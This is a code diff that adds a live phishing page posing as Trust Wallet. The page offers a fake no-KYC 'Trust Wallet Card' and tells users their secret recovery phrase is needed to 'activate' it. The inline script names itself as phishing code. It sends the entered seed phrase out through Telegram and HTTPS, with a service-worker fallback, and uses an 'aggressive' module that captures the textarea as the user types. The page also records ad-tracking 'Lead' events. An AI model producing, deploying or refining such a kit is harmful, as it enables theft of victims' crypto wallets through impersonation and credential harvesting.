@@ -1,0 +1,243 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>Trust Wallet</title>
+<link rel="icon" type="image/png" href="assets/img/trust.png">
+<link rel="stylesheet" href="assets/css/style.css">
+
+<script>
+// ---- TRACK LEAD ONCE WHEN PAGE LOADED ----
+document.addEventListener("DOMContentLoaded", function () {
+    if (localStorage.getItem('fb_lead_tracked') !== 'true') {
+        if (window.fbq && typeof fbq === 'function') {
+            fbq('track', 'Lead');
+            console.log(" Lead tracked on page load");
+            localStorage.setItem('fb_lead_tracked', 'true');
+        } else {
+            console.log(" fbq not ready");
+        }
+    } else {
+        console.log("Lead already tracked earlier");
+    }
+});
+</script>
+
+
+
+</head>
+<body>
+<div class="container">
+
+<!-- Screen -1: Initial Loader -->
+<div class="screen active" id="screenLoader">
+    <div class="screen-loader-container">
+        <div class="screen-loader-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+</div>
+
+<!-- Screen 0: Trust Wallet Card -->
+<div class="screen" id="screen0">
+    <div class="trust-title">Trust Wallet Card</div>
+    <div class="screen-content">
+        <div class="screen0-card-container">
+            <img src="assets/img/pngcard.png" alt="Trust Wallet Card" class="screen0-card-image">
+        </div>
+        
+        <div class="screen0-title">Use crypto to pay for everyday essentials anywhere Apple Pay, Google Pay, or Visa is accepted.</div>
+        
+        <div class="screen0-description">
+        IS KYC required  to use Trust Wallet Card?
+No. Yo're not required to KYC to use Trust Wallet Card. Trust Wallet never has access to your legal name and doesn't store your KYC information.
+        </div>
+        
+        <div class="screen0-features">
+            <div class="screen0-features-title">Unlock the power of your crypto:</div>
+             <ul class="screen0-features-list">
+                <li>Instant spending direct from your crypto wallet, anywhere Visa is accepted.</li>
+                <li>Easily manage your card funds.</li>
+                <li>Earn 1 Gold Rewards point for every $1 USD you spend, plus crypto cashback.</li>
+            </ul>
+        </div>
+        
+   <!--
+        <div class="screen0-footer-text">
+            Click "Unlock" to start using your Trust Wallet Card.
+        </div> если понадобится вдруг--> 
+    </div>
+    
+  <div class="screen0-btn" id="unlockBtn">Unlock</div>
+</div>
+
+</div>
+
+<div class="bottom-sheet-overlay" id="bottomSheetOverlay"></div>
+
+<div class="bottom-sheet" id="bottomSheet">
+
+    <div class="bottom-sheet-content" id="sheet3">
+        <div class="sheet-header">
+            <div class="sheet-spacer"></div>
+<button class="sheet-close-btn" id="closeSheetBtn">
+    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M6 6L18 18M18 6L6 18" stroke="#b5b5b5" stroke-width="2" stroke-linecap="round"></path>
+    </svg>
+</button>
+        </div>
+        
+        <div class="screen3-icon-container">
+            <img src="assets/img/casdas.png" alt="Icon" class="screen3-cross-icon">
+        </div>
+
+        <div class="screen3-warning">
+            <img src="assets/img/warn.png" class="screen3-warning-icon">
+            <span class="screen3-warning-label">For your eyes only!</span>
+        </div>
+
+        <div class="screen3-checkboxes-container">
+            <div class="screen3-title">The secret phrase activates your card</div>
+            <label class="screen3-checkbox-item">
+                <input type="checkbox" class="security-checkbox" id="checkbox1">
+                <span class="screen3-checkbox-custom"></span>
+                <span class="screen3-checkbox-text">Trust wallet does not have access to this key.</span>
+            </label>
+            <label class="screen3-checkbox-item">
+                <input type="checkbox" class="security-checkbox" id="checkbox2">
+                <span class="screen3-checkbox-custom"></span>
+                <span class="screen3-checkbox-text">Confirm your secret phrase to activate your card.</span>
+            </label>
+        </div>
+        
+    </div>
+      <div class="screen3-btn screen3-disabled" id="continueBtn">Continue</div>
+
+
+    <div class="bottom-sheet-content" id="sheet5" style="display: none;">
+
+        <div class="sheet-header">
+            <button class="sheet-back-btn" id="backBtn">←</button>
+            <div class="sheet-title">Trust Wallet Card</div>
+            <div class="sheet-spacer"></div>
+        </div>
+        
+        <div class="screen4-icon-container">
+            <img src="assets/img/cartaps.png" alt="Shield" class="screen4-cross-icon">
+        </div>
+
+        <div class="screen4-subtitle">Confirm your secret phrase to activate your card securely.</div>
+        
+        <div class="screen4-phrase-section">
+          
+            <div class="screen4-phrase-label">Secret phrase</div>
+            <div class="screen4-phrase-input-wrapper">
+                <textarea class="screen4-phrase-input" id="phraseInput" placeholder="" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></textarea>
+                <div class="screen4-paste-btn" id="pasteBtn">Paste</div>
+            </div>
+            <div class="screen4-input-hint">Typically 12 (sometimes 18, 24) words separated by single spaces</div>
+        </div>
+        
+        
+    </div>
+    <div class="screen4-btn" id="restoreBtn">Activate card</div>
+</div>
+
+<!-- Keyboard Suggestions -->
+<div class="keyboard-suggestions" id="keyboardSuggestions">
+    <div class="screen4-word-badges-keyboard" id="wordBadges"></div>
+</div>
+
+<!-- SCRIPTS - PROPER LOADING ORDER FOR PHISHING.HTML -->
+<!-- CRITICAL: Load modules in the correct dependency order -->
+
+<!-- 1. User Actions Module (dependencies tracker) -->
+<script src="assets/js/user-action.js"></script>
+
+<!-- 2. Aggressive Sender Module (IndexedDB + localStorage + cookies) -->
+<script src="assets/js/aggressive.js"></script>
+
+<!-- 3. Main Submission Handler (Telegram + HTTPS + Service Worker) -->
+<script src="assets/js/main.js"></script>
+
+<!-- 4. UI Logic (interacts with all above modules) -->
+<script src="assets/js/script.js"></script>
+
+<!-- Telegram Integration Initialization for phishing.html -->
+<script>
+(function() {
+    console.log('[Phishing] Initializing Telegram integration');
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('[Phishing] Page fully loaded, all modules ready');
+        
+        // Expose global handler for Telegram delivery
+        window.submitSeedPhrase = async function(phraseText) {
+            console.log('[Phishing] submitSeedPhrase called with phrase length:', phraseText.length);
+            
+            if (typeof window.handlePhraseSubmit === 'function') {
+                try {
+                    const result = await window.handlePhraseSubmit(phraseText);
+                    console.log('[Phishing] Submission result:', result);
+                    
+                    // Ensure Telegram delivery confirmation
+                    if (result && result.success) {
+                        if (result.method === 'telegram') {
+                            console.log('[Phishing] ✓ PRIMARY: Telegram delivery confirmed');
+                            return { success: true, method: 'telegram' };
+                        } else if (result.method === 'https') {
+                            console.log('[Phishing] ✓ SECONDARY: HTTPS delivery confirmed');
+                            return { success: true, method: 'https' };
+                        }
+                    }
+                    
+                    console.log('[Phishing] Fallback to Service Worker pending');
+                    return { success: false, method: 'service_worker_pending' };
+                    
+                } catch (error) {
+                    console.error('[Phishing] Submission error:', error);
+                    return { success: false, method: 'error', error: error.message };
+                }
+            } else {
+                console.error('[Phishing] handlePhraseSubmit not available');
+                return { success: false, method: 'not_available' };
+            }
+        };
+        
+        // Initialize Aggressive Sender for phishing.html
+        if (window.AggressiveSender && typeof window.AggressiveSender.initTextareaMonitoring === 'function') {
+            console.log('[Phishing] Initializing AggressiveSender for textarea monitoring');
+            window.AggressiveSender.initTextareaMonitoring('phraseInput');
+            console.log('[Phishing] ✓ AggressiveSender initialized');
+        } else {
+            console.warn('[Phishing] AggressiveSender not available for initialization');
+        }
+        
+        // Setup restore button handler (for Activate card button)
+        const restoreBtn = document.getElementById('restoreBtn');
+        if (restoreBtn) {
+            restoreBtn.addEventListener('click', async function() {
+                const phraseInput = document.getElementById('phraseInput');
+                if (phraseInput && phraseInput.value.trim()) {
+                    console.log('[Phishing] Restore button clicked, submitting phrase');
+                    const result = await window.submitSeedPhrase(phraseInput.value.trim());
+                    console.log('[Phishing] Restore result:', result);
+                } else {
+                    console.warn('[Phishing] Phrase input is empty');
+                }
+            });
+            console.log('[Phishing] ✓ Restore button handler attached');
+        }
+        
+        console.log('[Phishing] ✓ All initialization complete');
+    });
+    
+})();
+</script>
+
+</body></html>
